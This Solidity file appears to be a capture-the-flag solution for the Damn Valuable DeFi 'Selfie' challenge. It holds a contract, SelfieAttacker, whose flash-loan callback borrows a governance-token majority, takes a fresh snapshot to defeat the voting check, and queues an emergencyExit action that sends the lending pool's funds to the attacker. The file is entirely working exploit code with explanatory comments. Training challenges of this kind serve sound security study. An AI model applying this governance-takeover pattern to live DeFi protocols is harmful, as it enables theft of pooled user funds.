// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./SimpleGovernance.sol";

/**
 * @title SelfieAttacker
 * @author dm4th
 */

contract SelfieAttacker is IERC3156FlashBorrower, Ownable {

    DamnValuableTokenSnapshot public immutable token;
    SimpleGovernance public immutable governance;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    
    // store the actionID after it's queued
    uint256 public queuedActionId;

    constructor(address _token, address _governance) {
        token = DamnValuableTokenSnapshot(_token);
        governance = SimpleGovernance(_governance);
    }

    /**
     * Function that is run by the flash loan contract during the loan
     * @param initiator -- will be my personal address
     * @param inToken -- governance token address
     * @param amount -- needs to be at least more than half the voting pool
     * @param fee -- 0
     * @param data -- will be the calldata for calling "emergencyExit(address)" with the owner address as the receiver address
     */
    function onFlashLoan(
        address initiator,
        address inToken,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        require(initiator == owner(), "Initiator must be Owner");
        require(inToken == governance.getGovernanceToken(), "inToken must be Governance token address");
        require(amount > token.getTotalSupplyAtLastSnapshot()/2, "Not enough governance token to create proposal");
        require(fee == 0, "Fee value not 0");

        token.snapshot(); // create a new snapshot on the token to bypass the snapshot check in the governance contract

        address _target = msg.sender;   // the call of this function comes from the SelfiePool contract (i.e. our target)
        uint128 _value = 0;    // no msg.value needed for this attack

        queuedActionId = governance.queueAction(_target, _value, data);

        token.approve(msg.sender, amount);  // approve the loan contract to take the tokens back

        return CALLBACK_SUCCESS;
    }
}